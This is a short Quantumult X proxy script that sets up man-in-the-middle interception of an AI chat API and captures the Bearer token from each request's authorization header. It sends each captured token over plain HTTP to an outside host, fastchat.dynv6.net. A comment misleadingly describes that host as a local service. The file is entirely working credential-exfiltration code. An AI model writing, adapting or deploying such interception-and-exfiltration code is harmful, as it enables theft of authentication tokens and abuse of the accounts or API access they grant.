/*
Quantumult X Script
[rewrite_local]
^https:\/\/api-v4-generatechatstream-7hb5gcrmka-uc\.a\.run\.app url script-request-header ⁨chatkey.js

[mitm]
hostname = api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app
*/



// 监听请求头
const url = `^https:\/\/api-v4-generatechatstream-7hb5gcrmka-uc\.a\.run\.app`;

if ($request && $request.url.match(url)) {
    const authorizationHeader = $request.headers['authorization'];
    const bearerToken = authorizationHeader.split(' ')[1]; // 提取Bearer token

    if (bearerToken) {
        console.log(`Bearer Token: ${bearerToken}`);
        // 发送 HTTP 请求到本地 API 服务以保存 Token
        const saveTokenRequest = {
            url: 'http://fastchat.dynv6.net:8300/save-token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ token: bearerToken })
        };

        $task.fetch(saveTokenRequest).then(response => {
            console.log('Token saved response: ' + response.body);
        }, reason => {
            console.log('Error saving token: ' + reason.error);
        });
    } else {
        console.log("Bearer token not found.");
    }
}

$done({});
